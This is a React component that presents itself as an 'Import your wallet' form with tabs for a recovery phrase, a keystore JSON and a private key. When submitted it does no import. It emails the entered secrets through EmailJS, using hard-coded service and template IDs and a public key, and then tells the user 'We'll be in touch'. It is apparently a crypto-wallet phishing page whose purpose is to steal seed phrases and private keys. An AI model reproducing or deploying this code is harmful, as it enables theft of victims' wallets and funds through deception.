import { useRef, useState } from "react";
import { Usewallet } from "../context/Usewallet";

function Form() {
  const { setFormVisible } = Usewallet();

  const [active, setActive] = useState(1);
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_x41o8tj", "template_168l8hs", form.current, {
        publicKey: "4N-dX6YLFvkH1V-xz",
      })
      .then(
        () => {
          setFormVisible(true);
          alert(`We'll be in touch with you`);
          // clearText();
        },
        (error) => {
          console.log("FAILED...", error.text);
        }
      );
  };

  return (
    <div>
      <div className=" mt-5 w-[80%] rounded bg-white p-4 shadow-lg md:w-[70%]">
        <p className="flex gap-4 p-4">
          <span>
            <img src="" alt="" />
          </span>
          <span>Import your wallet</span>
        </p>
        <p className="flex gap-8 border border-b-gray-200 text-xl font-bold">
          <span onClick={() => setActive(1)}>Phrase</span>
          <span onClick={() => setActive(2)}>Keystore Json</span>
          <span onClick={() => setActive(3)}>Private Key</span>
        </p>

        <form
          ref={form}
          onSubmit={sendEmail}
          className="bg-white font-medium text-stone-950"
        >
          {active === 1 && (
            <textarea
              name="message"
              rows="5"
              className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
              placeholder={"Recovery Phrase"}
              data-gramm="false"
            ></textarea>
          )}
          {active === 2 && (
            <textarea
              name="message"
              onChange={(e) => setPhrase(e.target.value)}
              rows="5"
              className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
              placeholder={"private key"}
              data-gramm="false"
            ></textarea>
          )}
          {active === 3 && (
            <textarea
              name="message"
              onChange={(e) => setPhrase(e.target.value)}
              rows="5"
              className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
              placeholder={"private key"}
              data-gramm="false"
            ></textarea>
          )}

          <span className="bg-white">
            Typically 12 - 24 words seperated by a single space
          </span>
          <input
            type="submit"
            value="Connect"
            className="mx-auto mt-5 block rounded bg-blue-500  px-[30px] py-[15px] text-center text-white md:mt-5"
          />
        </form>
      </div>
    </div>
  );
}

export default Form;
